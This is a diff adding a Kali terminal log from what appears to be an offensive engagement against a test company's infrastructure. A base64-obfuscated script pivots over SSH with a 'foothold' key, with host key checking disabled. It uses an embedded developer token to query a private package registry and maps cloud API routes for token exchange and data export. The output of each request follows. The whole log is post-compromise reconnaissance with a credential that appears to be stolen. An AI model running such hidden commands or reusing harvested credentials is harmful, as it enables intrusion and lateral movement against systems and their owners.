@@ -1,0 +1,85 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08npm2.sh <<'B64EOF'
+> dGltZW91dCA5MCBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkByb3dhbi1kZXYgJwpDQT1+Ly5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0ClU9cm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4bwpQPWh0dHBzOi8vcGFja2FnZXMua2VwbGVyb3BzLnRlc3QKZWNobyAiPT09IHN1cHBvcnQtcmVoZWFyc2FsID09PSI7IGN1cmwgLXNTIC0tY2FjZXJ0ICRDQSAtdSAiJFUiIC1pICIkUC9Aa2VwbGVyb3BzJTJmc3VwcG9ydC1yZWhlYXJzYWwiIHwgaGVhZCAtNDA7IGVjaG8KZWNobyAiPT09IHNlYXJjaCBlbnRpdGxlbWVudCA9PT0iOyBjdXJsIC1zUyAtLWNhY2VydCAkQ0EgLXUgIiRVIiAtaSAiJFAvLS92MS9zZWFyY2g/dGV4dD1lbnRpdGxlbWVudCIgfCBoZWFkIC0zMDsgZWNobwplY2hvICI9PT0gYWxsID09PSI7IGN1cmwgLXNTIC0tY2FjZXJ0ICRDQSAtdSAiJFUiIC1pICIkUC8tL2FsbCIgfCBoZWFkIC0yMDsgZWNobwplY2hvICI9PT0gaW5kZXhlciB3ZWxsa25vd24gPT09IjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC1pIGh0dHBzOi8vaW5kZXhlci5rZXBsZXJvcHMudGVzdC8ud2VsbC1rbm93bi9maWVsZGtlc3QtY2xpZW50IHwgaGVhZCAtMzA7IGVjaG8KZWNobyAiPT09IGNsb3VkLWFwaSB3ZWxsa25vd24gPT09IjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC1pIGh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0Ly53ZWxsLWtub3duL2ZpZWxka2VzdC1jbGllbnQgfCBoZWFkIC0zMDsgZWNobwplY2hvICI9PT0gYXJ3YyB3ZWxsa25vd24gPT09IjsgY3VybCAtc1MgLS1jYWNlcnQgJENBIC1pIGh0dHBzOi8vY29ubmVjdG9yLmFyd2MudGVzdC8ud2VsbC1rbm93bi9maWVsZGtlc3QtY2xpZW50IHwgaGVhZCAtMzAKJyAyPiYxIHwgaGVhZCAtMjAwCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08npm2.sh; bash /tmp/k08npm2.sh; echo DONEMARK_1795208346193$((6*7))
+=== support-rehearsal ===
+HTTP/1.1 403 Forbidden
+X-Powered-By: hidden
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 94
+ETag: W/"5e-6D/EmqdbsiR6pMUKE0ydUezGL+I"
+Vary: Accept-Encoding
+Date: Fri, 20 Nov 2026 20:59:17 GMT
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+{
+  "error": "user rowan.ito is not allowed to access package @keplerops/support-rehearsal"
+}
+
+=== search entitlement ===
+HTTP/1.1 200 OK
+X-Powered-By: hidden
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 63
+ETag: W/"3f-0OZjQZVsgndkZ2ZXP/oY0KNaPes"
+Vary: Accept-Encoding
+Date: Fri, 20 Nov 2026 20:59:17 GMT
+Connection: keep-alive
+Keep-Alive: timeout=60
+
+{"objects":[],"total":0,"time":"Fri, 20 Nov 2026 20:59:17 GMT"}
+=== all ===
+HTTP/1.1 200 OK
+X-Powered-By: hidden
+Access-Control-Allow-Origin: *
+Content-type: application/json; charset=utf-8
+Date: Mon, 10 Oct 1983 00:12:48 GMT
+Vary: Accept-Encoding
+Connection: keep-alive
+Keep-Alive: timeout=60
+Transfer-Encoding: chunked
+
+{"_updated":99999,
+"@keplerops/fieldlink-connector":{"name":"@keplerops/fieldlink-connector","description":"FieldLink field-device diagnostic summary connector","dist-tags":{"latest":"7.4.2"},"maintainers":[],"readmeFilename":"README.md","time":{"modified":"2026-11-19T13:49:20.256Z"},"license":"UNLICENSED","versions":{"7.4.2":"latest"}}}
+
+=== indexer wellknown ===
+HTTP/1.1 200 OK
+Server: FieldKest/1.0 Python/3.12.11
+Date: Fri, 20 Nov 2026 20:59:17 GMT
+Content-Type: application/json
+Content-Length: 358
+X-Content-Type-Options: nosniff
+X-Request-ID: fa626b9f-4c17-481c-8518-5d8f218f93dd
+
+{"purpose":"Submit native .fki release-bundle archives for indexing.","related":[],"routes":[{"body":{"bundle_hex":"hex-encoded .fki archive"},"key":"indexer.indexes","method":"POST","template":"https://indexer.keplerops.test/api/indexes"}],"schema":"fieldkest.client-documents/v1","service":"indexer.keplerops.test","title":"Bundle index client reference"}
+
+=== cloud-api wellknown ===
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 20:59:17 GMT
+Content-Type: application/json
+Content-Length: 1985
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-Request-ID: ebbaf968-5651-4a1e-bfd6-a108df11693d
+
+{"purpose":"Workspace identity, build records, trust records, and maintenance policy operations.","related":["https://data.keplerops.test/.well-known/fieldkest-client","https://workloads.keplerops.test/.well-known/fieldkest-client"],"routes":[{"key":"cloud.workspace-exchange","method":"GET","template":"https://cloud-api.keplerops.test/api/workspaces/current/token-exchange"},{"key":"cloud.workspace-token","method":"POST","template":"https://cloud-api.keplerops.test/api/workspaces/current/token-exchange"},{"key":"cloud.build-record","method":"GET","template":"https://cloud-api.keplerops.test/api/build-records/{build_id}"},{"key":"data.export","method":"GET","template":"https://cloud-api.keplerops.test/api/exports/{export_id}"},{"key":"data.export-definition","method":"GET","template":"https://cloud-api.keplerops.test/api/exports/{export_id}/definition"},{"key":"data.export-destination","method":"PATCH","template":"https://cloud-api.keplerops.test/api/exports/{export_id}/destination"},{"key":"data.export-runs","method":"POST","template":"https://cloud-api.keplerops.test/api/exports/{export_id}/runs"},{"key":"workloads.schedule","method":"GET","template":"https://cloud-api.keplerops.test/api/schedules/{schedule_id}"},{"key":"workloads.schedule-update","method":"PATCH","template":"https://cloud-api.keplerops.test/api/schedules/{schedule_id}"},{"key":"workloads.schedule-runs","method":"POST","template":"https://cloud-api.keplerops.test/api/schedules/{schedule_id}/runs"},{"key":"cloud.trust-record","method":"GET","template":"https://cloud-api.keplerops.test/api/trust-records/{trust_id}"},{"key":"cloud.role-exchange","method":"POST","template":"https://cloud-api.keplerops.test/api/token-exchange/{role}"},{"key":"cloud.maintenance","method":"GET","template":"https://cloud-api.keplerops.test/api/maintenance"},{"key":"cloud.policy","method":"GET","template":"https://cloud-api.keplerops.test/api/policies/{policy_id}"}],"title":"Cloud workspace client reference"}
+
+=== arwc wellknown ===
+HTTP/1.0 404 Not Found
+Server: FieldKest-Customer-Relay/1.0 
+Date: Fri, 20 Nov 2026 20:59:17 GMT
+Content-Type: application/json
+Content-Length: 28
+Cache-Control: no-store
+X-Content-Type-Options: nosniff
+
+{"error":"route_not_found"}
